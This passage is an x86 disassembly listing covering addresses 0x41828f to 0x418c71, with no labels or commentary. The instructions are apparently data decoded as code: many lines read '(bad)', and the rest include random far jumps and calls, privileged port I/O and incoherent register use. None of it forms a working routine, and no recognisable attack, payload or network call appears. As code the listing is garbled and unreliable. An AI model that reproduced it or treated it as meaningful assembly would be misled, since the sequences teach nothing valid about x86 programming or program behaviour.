  41828f:	and    bl,BYTE PTR [ebx]
  418291:	cmp    BYTE PTR [edx],ah
  418293:	loopne 0x41824c
  418295:	(bad)  
  418296:	mov    ebp,DWORD PTR [edx-0x5b]
  418299:	mov    ah,0x7b
  41829b:	shl    ebp,cl
  41829d:	and    eax,0x44c8d876
  4182a2:	lds    edi,FWORD PTR [esi-0x58ad40ff]
  4182a8:	fadd   st,st(3)
  4182aa:	shr    DWORD PTR [edi+0x74053bda],1
  4182b0:	into   
  4182b1:	aam    0x22
  4182b3:	push   ss
  4182b4:	push   ecx
  4182b5:	(bad)  
  4182b7:	jns    0x4182ba
  4182b9:	div    cl
  4182bb:	sbb    edx,DWORD PTR [edi+0x2d]
  4182be:	mov    ds:0x9d6b8dd4,eax
  4182c3:	xchg   ebp,eax
  4182c4:	jns    0x41829b
  4182c6:	cld    
  4182c7:	cld    
  4182c8:	lods   al,BYTE PTR ds:[esi]
  4182c9:	jp     0x4182b2
  4182cb:	sbb    dl,BYTE PTR [eax-0x2e309a62]
  4182d1:	popf   
  4182d2:	cmp    DWORD PTR [ebp+0x74],0x1
  4182d6:	sub    ebx,edi
  4182d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4182d9:	sbb    BYTE PTR [ecx+0x59],dl
  4182dc:	pushf  
  4182dd:	(bad)
  4182e1:	fidivr WORD PTR [edx+ebp*4+0x53]
  4182e5:	xchg   edi,eax
  4182e6:	mov    ebp,0x91dfc350
  4182eb:	pop    es
  4182ec:	fcomp  DWORD PTR [esi]
  4182ee:	loope  0x41828d
  4182f0:	mov    dh,BYTE PTR [esi]
  4182f2:	clc    
  4182f3:	sbb    dh,bh
  4182f5:	fdivr  DWORD PTR [ecx+0x74347d13]
  4182fb:	icebp  
  4182fc:	pushf  
  4182fd:	test   DWORD PTR ds:0xcd5a86f6,eax
  418303:	pop    eax
  418304:	jecxz  0x418345
  418306:	cmp    cl,bh
  418308:	xchg   BYTE PTR gs:[ecx],bh
  41830b:	inc    esp
  41830c:	jne    0x4182a3
  41830e:	cs fst st(4)
  418311:	push   edx
  418312:	dec    eax
  418313:	lock sub cl,BYTE PTR ds:0xb7da42d5
  41831a:	push   ebx
  41831b:	add    DWORD PTR [eax-0x36],eax
  41831e:	and    ch,ah
  418320:	jo     0x418323
  418322:	mov    cl,0xf2
  418324:	lea    ebx,[edi]
  418326:	adc    DWORD PTR [esi-0x715daef1],edi
  41832c:	sbb    bl,BYTE PTR [ecx-0x4e]
  41832f:	pop    ecx
  418330:	icebp  
  418331:	pop    ebx
  418332:	retf   0x753b
  418335:	xor    eax,0x1b154895
  41833a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41833b:	and    BYTE PTR [edi-0x60e107c1],ah
  418341:	add    DWORD PTR [ecx+0x1530d873],0xffffff80
  418348:	cmp    al,0x7e
  41834a:	pop    esi
  41834b:	dec    ebx
  41834c:	mov    bh,0x99
  41834e:	jb     0x4183b2
  418350:	test   BYTE PTR [ebp+ebp*8-0x2c],ah
  418354:	int3   
  418355:	fldenv [esi+0x7f15ba97]
  41835b:	scas   eax,DWORD PTR es:[edi]
  41835c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41835d:	imul   edi,DWORD PTR [edi-0x5e],0x4776f476
  418364:	mov    ch,ch
  418366:	es sbb edi,ebx
  418369:	not    DWORD PTR [edi-0x57a85b7d]
  41836f:	(bad)  
  418370:	in     al,dx
  418371:	int    0xb0
  418373:	push   eax
  418374:	fwait
  418375:	xchg   edi,eax
  418376:	ins    BYTE PTR es:[edi],dx
  418377:	or     al,0xb5
  418379:	fstp   QWORD PTR [edx+0x7ca096bd]
  41837f:	push   edx
  418380:	pushf  
  418381:	push   edi
  418382:	retf   0xc619
  418385:	test   eax,eax
  418387:	fild   DWORD PTR [edi-0x58]
  41838a:	test   al,0x63
  41838c:	jle    0x41835f
  41838e:	lahf   
  41838f:	mov    dh,0xef
	...
  4183f1:	add    BYTE PTR [eax],al
  4183f3:	add    ah,bl
  4183f5:	mov    bl,0x3f
  4183f7:	push   eax
  4183f8:	jg     0x4183d6
  4183fa:	(bad)  
  4183fb:	mov    edi,0x14d871ac
  418400:	inc    ebx
  418401:	mov    edx,0xc207f6
  418406:	add    DWORD PTR [eax],eax
  418408:	add    eax,0x8a000001
  41840d:	xor    eax,0x189c31fa
  418412:	aad    0xed
  418414:	bound  ecx,QWORD PTR [edi-0x18]
  418417:	sub    al,0x4a
  418419:	pop    edx
  41841a:	xor    bh,BYTE PTR [edi+0x44]
  41841d:	popf   
  41841e:	cwde   
  41841f:	out    0x3d,al
  418421:	mov    esi,0xe5faa3bd
  418426:	fsubr  st,st(0)
  418428:	mov    eax,ds:0x8f470d5
  41842d:	fbld   TBYTE PTR [edi+0x6fea32b8]
  418433:	adc    BYTE PTR [edx+eax*1],cl
  418436:	mov    al,dl
  418438:	cs fwait
  41843a:	jecxz  0x4183dd
  41843c:	sub    DWORD PTR [ebp-0x78d93bc],edx
  418442:	jbe    0x41845c
  418444:	mov    eax,DWORD PTR ds:0x1e4d2cf5
  41844a:	mov    cl,0x21
  41844c:	test   al,0xf1
  41844e:	retf   
  41844f:	pusha  
  418450:	mov    ah,0x91
  418452:	(bad)  
  418453:	out    dx,al
  418454:	sti    
  418455:	aas    
  418456:	test   ecx,ecx
  418458:	js     0x4184bb
  41845a:	inc    edx
  41845b:	dec    esi
  41845c:	pop    ds
  41845d:	push   0xfffffffb
  41845f:	imul   BYTE PTR [edi-0x54f8f830]
  418465:	jo     0x418434
  418467:	ret    0xd78a
  41846a:	mov    ch,0xed
  41846c:	pop    ecx
  41846d:	xchg   edx,eax
  41846e:	mov    ebx,0xd5f61901
  418473:	xor    eax,0x8c8f8414
  418478:	sub    dl,al
  41847a:	push   ds
  41847b:	mov    ebx,0x5c62bcf8
  418480:	and    edi,ecx
  418482:	fnsave [esi+0x120dfe10]
  418488:	adc    DWORD PTR [ecx-0x711f9a71],edx
  41848e:	or     eax,0xe24b5f5a
  418493:	and    eax,0x47fde86d
  418498:	stos   DWORD PTR es:[edi],eax
  418499:	inc    ebx
  41849a:	std    
  41849b:	xor    BYTE PTR [edx+0x2e44395c],bl
  4184a1:	test   DWORD PTR [esi+0x732be35d],ebx
  4184a7:	push   ebp
  4184a8:	fbstp  TBYTE PTR [ecx-0x3522327c]
  4184ae:	cmp    al,0x3d
  4184b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184b1:	sbb    DWORD PTR [ecx],ebp
  4184b3:	inc    ecx
  4184b4:	aaa    
  4184b5:	lods   eax,DWORD PTR ds:[esi]
  4184b6:	retf   
  4184b7:	aas    
  4184b8:	in     al,dx
  4184b9:	arpl   sp,sp
  4184bb:	mov    edi,0x41744e48
  4184c0:	lahf   
  4184c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4184c2:	pushf  
  4184c3:	dec    edx
  4184c4:	and    edi,eax
  4184c6:	xor    al,0x1c
  4184c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184c9:	in     eax,0xff
  4184cb:	inc    esp
  4184cc:	jge    0x418453
  4184ce:	(bad)  
  4184cf:	add    al,0x7
  4184d1:	adc    edx,DWORD PTR [esp+ecx*4-0x546fefb]
  4184d8:	ret    
  4184d9:	inc    ecx
  4184da:	enter  0x9eed,0x9c
  4184de:	mov    al,0xaa
  4184e0:	xchg   ebx,eax
  4184e1:	mov    WORD PTR [esi+0x7ded540c],?
  4184e7:	pop    eax
  4184e8:	pop    ecx
  4184e9:	dec    ecx
  4184ea:	xor    BYTE PTR [ebx],0x46
  4184ed:	push   DWORD PTR [edi+esi*1-0x3975f6b9]
  4184f4:	iret   
  4184f5:	pushf  
  4184f6:	push   ebp
  4184f7:	bound  ecx,QWORD PTR [edi+0x258b5ac]
  4184fd:	stos   DWORD PTR es:[edi],eax
  4184fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4184ff:	pop    eax
  418500:	mov    ds:0xfd9f5587,al
  418505:	add    DWORD PTR [edi-0x5a9108c],ebx
  41850b:	mov    cl,0x67
  41850d:	pop    edi
  41850e:	sub    dl,BYTE PTR [ebx+ecx*8]
	...
  418571:	add    BYTE PTR [eax],al
  418573:	add    BYTE PTR [ecx-0x7],al
  418576:	mov    ebx,ebx
  418578:	mov    ebx,0x26fb51fb
  41857d:	lods   al,BYTE PTR ds:[esi]
  41857e:	imul   dl
  418580:	dec    esi
  418581:	lock pop es
  418583:	jmp    0x105:0x101c7
  41858a:	add    BYTE PTR [eax],al
  41858c:	das    
  41858d:	fsubr  QWORD PTR [esi-0x62]
  418590:	mov    ebp,DWORD PTR [ecx]
  418592:	enter  0x5eca,0xb
  418596:	outs   dx,BYTE PTR ds:[esi]
  418597:	xor    ah,BYTE PTR [ecx+0x3eca0aba]
  41859d:	popa   
  41859e:	and    ch,ah
  4185a0:	arpl   cx,ax
  4185a2:	scas   eax,DWORD PTR es:[edi]
  4185a3:	inc    esi
  4185a4:	lds    edi,FWORD PTR [eax+0x55]
  4185a7:	out    dx,al
  4185a8:	xor    DWORD PTR [ecx+0x62],esi
  4185ab:	mov    bh,0xba
  4185ad:	sbb    bl,dl
  4185af:	dec    ebx
  4185b0:	and    bh,BYTE PTR [eax+0x49]
  4185b3:	imul   ebp,DWORD PTR [esi-0x568c92bb],0x43d9f92
  4185bd:	sar    DWORD PTR [eax-0x27],cl
  4185c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4185c1:	fadd   QWORD PTR [edi+0x47]
  4185c4:	(bad)  
  4185c5:	sahf   
  4185c6:	mov    edx,0x4e9cb1c4
  4185cb:	retf   
  4185cc:	mov    al,ds:0x36599236
  4185d1:	add    al,0xe6
  4185d3:	ins    BYTE PTR es:[edi],dx
  4185d4:	push   eax
  4185d5:	add    eax,esi
  4185d7:	jne    0x418574
  4185d9:	dec    ebx
  4185da:	test   dl,dl
  4185dc:	xchg   esi,eax
  4185dd:	mov    edx,0x3d8f17f6
  4185e2:	add    bl,BYTE PTR [ecx+edx*4-0x55]
  4185e6:	fst    QWORD PTR [eax+ecx*1]
  4185e9:	xor    BYTE PTR [ebx-0x290f6c65],al
  4185ef:	jmp    0x2dfd4e22
  4185f4:	test   eax,0xa69d671
  4185f9:	in     eax,dx
  4185fa:	in     eax,dx
  4185fb:	(bad)  
  4185fc:	jecxz  0x41864c
  4185fe:	int3   
  4185ff:	mov    ch,0x96
  418601:	inc    eax
  418602:	xchg   ecx,eax
  418603:	retf   0x5596
  418606:	shr    BYTE PTR [ebx],1
  418608:	pop    ss
  418609:	dec    esi
  41860a:	push   DWORD PTR [edx]
  41860c:	add    al,0xf0
  41860e:	clc    
  41860f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418610:	hlt    
  418611:	jecxz  0x41859e
  418613:	mov    al,ds:0x197382f4
  418618:	hlt    
  418619:	mov    ds:0x4b5f3934,al
  41861e:	xchg   ebx,eax
  41861f:	xor    cl,bh
  418621:	jae    0x4185b4
  418623:	shl    DWORD PTR [edi+edi*8-0x3aee8374],cl
  41862a:	xchg   ebp,eax
  41862b:	enter  0x9f52,0xa7
  41862f:	(bad)  
  418630:	adc    esp,DWORD PTR [ebx-0x7c]
  418633:	dec    ecx
  418634:	cmc    
  418635:	adc    eax,0x923cee08
  41863a:	rcl    ah,0x52
  41863d:	inc    edi
  41863e:	lods   al,BYTE PTR ds:[esi]
  41863f:	jne    0x418631
  418641:	call   0x8b98:0xfe6c78f3
  418648:	jmp    0x528b34a1
  41864d:	dec    edi
  41864e:	ss pop eax
  418650:	gs js  0x4186a5
  418653:	add    dl,ah
  418655:	mov    dl,0xcc
  418657:	xchg   ebx,eax
  418658:	push   es
  418659:	in     al,0xfa
  41865b:	and    eax,0x5bf9895b
  418660:	out    dx,eax
  418661:	inc    esi
  418662:	jno    0x41868b
  418664:	adc    dh,0x3b
  418667:	sbb    ebp,DWORD PTR [eax]
  418669:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41866a:	rcl    esi,1
  41866c:	mov    ch,0x13
  41866e:	movd   mm1,DWORD PTR [ebp+0x83bffe7]
  418675:	adc    edi,DWORD PTR [eax]
  418677:	andnps xmm7,XMMWORD PTR [ebp-0x1b]
  41867b:	mov    ah,0x14
  41867d:	aam    0x69
  41867f:	jge    0x41865c
  418681:	cld    
  418682:	mov    dl,BYTE PTR [ebp-0x69]
  418685:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418686:	sbb    eax,edi
  418688:	test   eax,0xba7951f6
  41868d:	pop    ebx
  41868e:	or     al,0x1e
  418690:	je     0x418692
	...
  4186f2:	add    BYTE PTR [eax],al
  4186f4:	xchg   ebx,eax
  4186f5:	sub    BYTE PTR [eax-0x604344c4],ah
  4186fb:	scas   eax,DWORD PTR es:[edi]
  4186fc:	or     al,0x8d
  4186fe:	cmp    edx,edx
  418700:	popf   
  418701:	xor    BYTE PTR [edi+0x102ccec],ch
  418707:	add    BYTE PTR ds:0xed000001,al
  41870d:	in     al,dx
  41870e:	leave  
  41870f:	out    dx,eax
  418710:	jnp    0x418742
  418712:	scas   eax,DWORD PTR es:[edi]
  418713:	pop    ds
  418714:	mov    dl,0xe9
  418716:	pop    edx
  418717:	lahf   
  418718:	xor    DWORD PTR [ebx],edx
  41871a:	mov    eax,0x63ad549b
  41871f:	inc    esi
  418720:	add    eax,0x3a404c56
  418725:	(bad)  
  418726:	mov    eax,ds:0x4c0ce603
  41872b:	daa    
  41872c:	sub    ecx,DWORD PTR [esi-0x5f]
  41872f:	jp     0x418714
  418731:	test   BYTE PTR ds:0xae6fa7d,ch
  418737:	pop    ebp
  418738:	in     al,0xb9
  41873a:	ins    BYTE PTR es:[edi],dx
  41873b:	mov    al,ds:0x43cab702
  418740:	jmp    0xb420ba88
  418745:	push   edi
  418746:	outs   dx,DWORD PTR ds:[esi]
  418747:	mov    bh,0x1d
  418749:	cli    
  41874a:	mov    BYTE PTR [ebp+0x19bf9622],cl
  418750:	cli    
  418751:	clc    
  418752:	adc    BYTE PTR [esi-0x46],ch
  418755:	pop    esi
  418756:	pushf  
  418757:	sbb    ch,0xa3
  41875a:	xor    eax,0xfb8d847e
  41875f:	sbb    BYTE PTR [ecx+eiz*8-0x60],al
  418763:	xchg   DWORD PTR [ebx+0x17c85008],edx
  418769:	sub    DWORD PTR [edx-0x72],edi
  41876c:	mov    edi,0x824afb60
  418771:	(bad)  
  418772:	jo     0x4187e6
  418774:	into   
  418775:	cmp    eax,0xeea8114b
  41877a:	jbe    0x418701
  41877c:	mov    dh,0x8
  41877e:	dec    esi
  41877f:	mov    eax,ds:0xc1f601d7
  418784:	sbb    DWORD PTR [ebx+0x72cfbf43],esi
  41878a:	sbb    al,0x93
  41878c:	(bad)  
  41878d:	pop    esi
  41878e:	neg    BYTE PTR [ecx+0x72]
  418791:	lods   eax,DWORD PTR ds:[esi]
  418792:	int3   
  418793:	in     al,dx
  418794:	shl    bl,cl
  418796:	sbb    ecx,DWORD PTR [eax]
  418798:	in     al,0xcc
  41879a:	sbb    al,0x73
  41879c:	test   al,0xf7
  41879e:	pop    edi
  41879f:	sub    BYTE PTR [esi+0x4dea49b4],ah
  4187a5:	dec    esi
  4187a6:	push   cs
  4187a7:	push   esi
  4187a8:	pop    ecx
  4187a9:	mov    dl,0xc8
  4187ab:	and    bl,ch
  4187ad:	or     al,0xee
  4187af:	cwde   
  4187b0:	(bad)  
  4187b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4187b3:	add    al,0x26
  4187b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4187b6:	cmp    BYTE PTR [ebx],dl
  4187b8:	xor    al,BYTE PTR [esi-0x5bae30b1]
  4187be:	pushf  
  4187bf:	cwde   
  4187c0:	sbb    eax,0x5ab37476
  4187c5:	mov    ds:0x92cc1089,eax
  4187ca:	push   edx
  4187cb:	dec    ebx
  4187cc:	bound  ebp,QWORD PTR [edi+0x31]
  4187cf:	and    al,0xec
  4187d1:	mov    dh,BYTE PTR [esi-0x2d]
  4187d4:	jp     0x41882a
  4187d6:	das    
  4187d7:	ins    DWORD PTR es:[edi],dx
  4187d8:	xor    eax,DWORD PTR [edx+0x407146d1]
  4187de:	mov    esi,0xd31ac9ee
  4187e3:	mov    ds:0x8e1a375c,al
  4187e8:	or     BYTE PTR [eax-0x31c53535],cl
  4187ee:	xor    edx,DWORD PTR [ecx+0x3ea4d5de]
  4187f4:	mov    esp,0x4e6440e3
  4187f9:	push   edx
  4187fa:	push   0xffffffa1
  4187fc:	test   eax,0x25035a5d
  418801:	fld    TBYTE PTR [ecx+0x2b]
  418804:	call   ebx
  418806:	mov    eax,0x249b446e
  41880b:	mov    edi,0x747cb539
  418810:	cmp    eax,DWORD PTR [eax]
	...
  418872:	add    BYTE PTR [eax],al
  418874:	xchg   esp,eax
  418875:	enter  0x4337,0x7f
  418879:	push   esp
  41887b:	fbld   TBYTE PTR [esi-0xf63c533]
  418881:	cmp    esp,DWORD PTR [edi]
  418883:	xor    ecx,edx
  418885:	add    eax,DWORD PTR [ecx]
  418887:	add    BYTE PTR ds:0xd0000001,al
  41888d:	dec    ebx
  41888e:	mov    DWORD PTR [eax],edx
  418890:	out    dx,eax
  418891:	test   DWORD PTR [edx],ecx
  418893:	mov    DWORD PTR [ecx+0x38],esp
  418896:	out    0xae,eax
  418898:	aaa    
  418899:	out    0x39,eax
  41889b:	mov    ebx,DWORD PTR [eax-0x40]
  41889e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41889f:	loope  0x418878
  4188a1:	call   0x5389e24
  4188a6:	mov    ch,0x91
  4188a8:	shr    BYTE PTR [eax],1
  4188aa:	and    ebp,0x57d328d3
  4188b0:	adc    DWORD PTR [eax+0x50],ecx
  4188b3:	and    al,0x19
  4188b5:	jle    0x41883e
  4188b7:	lods   al,BYTE PTR ds:[esi]
  4188b8:	sar    BYTE PTR [esi+0x6ef69145],1
  4188be:	jl     0x41888e
  4188c0:	mov    dh,0x3f
  4188c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4188c3:	mov    eax,ebp
  4188c5:	(bad)  
  4188c7:	nop
  4188c8:	inc    eax
  4188c9:	xchg   ebx,eax
  4188ca:	outs   dx,BYTE PTR ds:[esi]
  4188cb:	sar    DWORD PTR [edx+eiz*8],1
  4188ce:	add    esi,eax
  4188d0:	repnz dec ebp
  4188d2:	in     eax,0x7b
  4188d4:	fsubr  DWORD PTR [esi-0x54]
  4188d7:	sbb    BYTE PTR [eax],dh
  4188d9:	in     al,dx
  4188da:	js     0x41887f
  4188dc:	retf   
  4188dd:	ja     0x4188b7
  4188df:	xchg   DWORD PTR [ecx],esi
  4188e1:	pop    ebx
  4188e2:	pusha  
  4188e3:	repnz or ecx,DWORD PTR [ecx-0x2a80f2e]
  4188ea:	pop    eax
  4188eb:	aam    0x8b
  4188ed:	mov    esp,0xa60d62b3
  4188f2:	mov    eax,ds:0x8bd3238f
  4188f7:	inc    eax
  4188f8:	cmc    
  4188f9:	cmp    al,BYTE PTR [edx]
  4188fb:	fbstp  TBYTE PTR [eax]
  4188fd:	shr    ebx,1
  4188ff:	mov    cl,0x42
  418901:	out    dx,eax
  418902:	push   edi
  418903:	or     DWORD PTR [eax],edx
  418905:	out    0xc5,eax
  418907:	sbb    BYTE PTR [ebp+0x3e],bl
  41890a:	and    DWORD PTR [esi],ecx
  41890c:	push   ss
  41890d:	shr    BYTE PTR [edx+eax*2-0x7a],1
  418911:	pushw  0xd461
  418915:	xchg   ebp,eax
  418916:	cdq    
  418917:	xchg   ebx,eax
  418918:	jp     0x4188b6
  41891a:	add    esp,eax
  41891c:	pop    DWORD PTR [edx+0x7ee284b1]
  418922:	ss jle 0x418949
  418925:	mov    esp,0xa83d6dea
  41892a:	pop    ss
  41892b:	cmc    
  41892c:	sub    al,0x6d
  41892e:	call   0x86c0:0xae57161a
  418935:	add    eax,0xeb75f714
  41893a:	out    dx,al
  41893b:	add    esp,esp
  41893d:	es sub eax,0x7454304
  418943:	cs sahf 
  418945:	pusha  
  418946:	fisub  WORD PTR [ecx]
  418948:	fadd   QWORD PTR [edx+0x1a]
  41894b:	mov    al,ds:0x5e7dff8d
  418950:	iret   
  418951:	and    ecx,DWORD PTR [ebx-0x74956073]
  418957:	add    edi,DWORD PTR [ebp-0x38]
  41895a:	adc    BYTE PTR [ebx-0x1365043a],ch
  418960:	xchg   esi,eax
  418961:	xchg   esi,eax
  418962:	xor    al,0xc9
  418964:	daa    
  418965:	cmp    ah,BYTE PTR [ebx]
  418967:	push   eax
  418968:	inc    ecx
  418969:	cwde   
  41896a:	pop    edx
  41896b:	daa    
  41896c:	and    ah,bl
  41896e:	lds    edx,FWORD PTR [ebx]
  418970:	add    cl,BYTE PTR [ebp+0x3d]
  418973:	xchg   esi,eax
  418974:	(bad)  
  418975:	ds sbb al,0x7
  418978:	inc    eax
  418979:	test   BYTE PTR [ecx],ah
  41897b:	in     eax,0x1e
  41897d:	pop    ecx
  41897e:	jecxz  0x418937
  418980:	adc    dh,BYTE PTR [ebp-0x3b]
  418983:	xchg   ecx,eax
  418984:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418985:	out    dx,al
  418986:	enter  0x6ce2,0x42
  41898a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41898c:	fisubr DWORD PTR [ecx]
  41898e:	stos   BYTE PTR es:[edi],al
  41898f:	xchg   BYTE PTR [eax+eax*1],bl
	...
  4189f2:	add    BYTE PTR [eax],al
  4189f4:	mov    WORD PTR [ecx-0x28a2e9ac],ss
  4189fa:	into   
  4189fb:	fwait
  4189fc:	add    bh,cl
  4189fe:	mov    ebp,0x3a1f4c69
  418a03:	push   0xffffffd6
  418a05:	add    al,0x1
  418a07:	add    BYTE PTR ds:0xc8000001,al
  418a0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a0e:	mov    dh,0x85
  418a10:	repnz neg DWORD PTR [esp+ecx*2-0x77ac8abb]
  418a18:	mov    esp,?
  418a1a:	push   ebp
  418a1b:	out    0xde,al
  418a1d:	test   al,0xbc
  418a1f:	ja     0x4189f0
  418a21:	mov    al,0x20
  418a23:	sbb    BYTE PTR [edi-0x2d],bh
  418a26:	call   0x5573:0xcec3db90
  418a2d:	int3   
  418a2e:	call   0xf045036d
  418a33:	jg     0x4189fc
  418a35:	nop
  418a36:	pop    ebx
  418a37:	mov    bh,0x50
  418a39:	les    esp,FWORD PTR [edx-0x55]
  418a3c:	dec    ebx
  418a3d:	cmp    ch,bh
  418a3f:	and    DWORD PTR [esi-0x63],0xbf1e121c
  418a46:	in     al,0x56
  418a48:	iret   
  418a49:	enter  0x8f31,0xf2
  418a4d:	imul   eax,edx,0xde69d51c
  418a53:	(bad)  
  418a54:	mov    eax,0x5cc9df64
  418a59:	push   es
  418a5a:	aad    0x8d
  418a5c:	lds    ebp,FWORD PTR [esi]
  418a5e:	iret   
  418a5f:	mov    ecx,0xda908bf9
  418a64:	xlat   BYTE PTR ds:[ebx]
  418a65:	sub    bh,BYTE PTR cs:[ecx+0x1885c83d]
  418a6c:	add    BYTE PTR [edx-0x35],dl
  418a6f:	icebp  
  418a70:	xchg   esi,eax
  418a71:	jmp    FWORD PTR [ebx-0x46]
  418a74:	call   DWORD PTR [ecx+0x4]
  418a77:	daa    
  418a78:	pop    ebx
  418a79:	aad    0x81
  418a7b:	loopne 0x418a2e
  418a7d:	cmc    
  418a7e:	mov    cl,0x1e
  418a80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a81:	mov    bl,0xe2
  418a83:	stos   DWORD PTR es:[edi],eax
  418a84:	cmp    eax,0x7e08630a
  418a89:	jmp    0x2b7b:0x9f35f2ed
  418a90:	mov    esi,0xb2587b3d
  418a95:	leave  
  418a96:	add    bl,BYTE PTR ds:0x7460eeb2
  418a9c:	xlat   BYTE PTR ds:[ebx]
  418a9d:	mov    cl,BYTE PTR [ecx-0x69e81148]
  418aa3:	pop    eax
  418aa4:	dec    ecx
  418aa5:	and    cl,BYTE PTR [eax-0x18f59330]
  418aab:	jmp    0x72948af4
  418ab0:	dec    edi
  418ab1:	cwde   
  418ab2:	aad    0x46
  418ab4:	ja     0x418af4
  418ab6:	sub    eax,0x44ee8590
  418abb:	je     0x418a6d
  418abd:	stc    
  418abe:	adc    al,0x2d
  418ac0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ac1:	mov    ds:0x61c12af9,eax
  418ac6:	pushf  
  418ac7:	pop    ebp
  418ac8:	fnstenv [ecx+0x7ec1adec]
  418ace:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418acf:	xlat   BYTE PTR ds:[ebx]
  418ad0:	cmc    
  418ad1:	xor    eax,0xeb58bef3
  418ad6:	xchg   ecx,eax
  418ad7:	jb     0x418b08
  418ad9:	xor    bh,BYTE PTR [edx+0x7aec79f8]
  418adf:	cmp    eax,0x4e56990c
  418ae4:	jno    0x418a8b
  418ae6:	aam    0xb1
  418ae8:	jl     0x418b15
  418aea:	adc    BYTE PTR [eax-0x4c],bh
  418aed:	repz push ss
  418aef:	fimul  DWORD PTR [edi-0x46]
  418af2:	(bad)  
  418af3:	pusha  
  418af4:	test   BYTE PTR [ebx-0x10],al
  418af7:	daa    
  418af8:	jnp    0x418ace
  418afa:	sub    BYTE PTR [edx-0x53],0x32
  418afe:	mov    ah,0xa1
  418b00:	in     eax,dx
  418b01:	fwait
  418b02:	adc    BYTE PTR [ecx+edx*2+0x398ce992],0x3
  418b0a:	mov    ebx,0xca0a4183
  418b0f:	mul    BYTE PTR ds:0x0
	...
  418b71:	add    BYTE PTR [eax],al
  418b73:	add    BYTE PTR [ebx+edx*1-0x7b],bh
  418b77:	xor    ch,bh
  418b79:	mov    dh,0xff
  418b7b:	pop    edi
  418b7c:	sar    BYTE PTR [ebp+0x3b],1
  418b7f:	in     eax,0xde
  418b81:	sbb    BYTE PTR [ecx-0x11],al
  418b84:	fild   DWORD PTR ds:0x1050001
  418b8a:	add    BYTE PTR [eax],al
  418b8c:	daa    
  418b8d:	jmp    0xc102788a
  418b92:	xchg   esi,eax
  418b93:	sbb    DWORD PTR [ecx-0x2a793eda],0xfffffff4
  418b9a:	fnstcw WORD PTR [esi]
  418b9c:	mov    cl,0xe3
  418b9e:	idiv   BYTE PTR [ecx+0x7c]
  418ba1:	jns    0x418bda
  418ba3:	(bad)  
  418ba5:	jnp    0x418ba5
  418ba7:	push   eax
  418ba8:	ins    DWORD PTR es:[edi],dx
  418ba9:	mov    eax,?
  418bab:	jg     0x418b78
  418bad:	xlat   BYTE PTR ss:[ebx]
  418baf:	cwde   
  418bb0:	enter  0x6d63,0xf0
  418bb4:	test   BYTE PTR [ebp+0x2926bf9c],bh
  418bba:	test   DWORD PTR [eax+0x7e],ebx
  418bbd:	(bad)  
  418bbe:	in     al,dx
  418bbf:	sbb    bh,BYTE PTR [ecx]
  418bc1:	aaa    
  418bc2:	mov    ah,0x1c
  418bc4:	popf   
  418bc5:	rcr    DWORD PTR [ebp+ebx*2+0x68],0x49
  418bca:	das    
  418bcb:	pushf  
  418bcc:	inc    ecx
  418bcd:	in     al,0xfa
  418bcf:	into   
  418bd0:	cmp    DWORD PTR [edx],ebx
  418bd2:	xchg   esi,eax
  418bd3:	add    ecx,esi
  418bd5:	push   esp
  418bd6:	leave  
  418bd7:	outs   dx,BYTE PTR ds:[esi]
  418bd8:	rcr    BYTE PTR [esi],1
  418bda:	sub    al,0x71
  418bdc:	mov    edi,0x2b2046ec
  418be1:	aas    
  418be2:	mov    BYTE PTR [esi-0x11],bl
  418be5:	cdq    
  418be6:	into   
  418be7:	sbb    eax,0x99670d40
  418bec:	jl     0x418b7e
  418bee:	sub    BYTE PTR [ecx+eax*8+0x665fafab],cl
  418bf5:	test   al,0x34
  418bf7:	push   edi
  418bf8:	lahf   
  418bf9:	fiadd  WORD PTR [edi]
  418bfb:	sbb    eax,0xcf62075a
  418c00:	mov    edi,0x7bded780
  418c05:	inc    esi
  418c06:	sub    cl,dh
  418c08:	sub    edi,DWORD PTR [edx+esi*1]
  418c0b:	cmp    esi,ebp
  418c0d:	pop    ebp
  418c0e:	out    0xa3,eax
  418c10:	js     0x418c41
  418c12:	mov    WORD PTR [ecx+0x5086a1bd],cs
  418c18:	or     eax,0xf1c60526
  418c1d:	call   0xf171:0xe9f3577
  418c24:	xor    dl,BYTE PTR [ecx]
  418c26:	push   ecx
  418c27:	imul   esp,DWORD PTR [eax+0x13be367e],0x515dd569
  418c31:	scas   eax,DWORD PTR es:[edi]
  418c32:	cmp    DWORD PTR [ebx-0x729e2a83],esi
  418c38:	pop    edi
  418c39:	cld    
  418c3a:	inc    esp
  418c3b:	pop    edi
  418c3c:	sbb    BYTE PTR ds:0xe0904d92,al
  418c42:	cmp    eax,0xa1635aec
  418c47:	and    BYTE PTR [edx+0x1f],ah
  418c4a:	push   edx
  418c4b:	fild   DWORD PTR [eax-0x30759c02]
  418c51:	ror    BYTE PTR [esi+ebx*2],0xc5
  418c55:	sahf   
  418c56:	(bad)  
  418c57:	push   ecx
  418c58:	dec    eax
  418c59:	lahf   
  418c5a:	outs   dx,BYTE PTR ds:[esi]
  418c5b:	mov    ecx,0x9b53dbbb
  418c60:	inc    ebx
  418c61:	xchg   DWORD PTR [ebx+0xb],ebx
  418c64:	mov    esp,0xeccbc8a7
  418c69:	sub    al,BYTE PTR [ecx-0x7f]
  418c6c:	pop    edx
  418c6d:	dec    eax
  418c6e:	bound  eax,QWORD PTR [ebx+ebx*8]
  418c71:	dec    esp
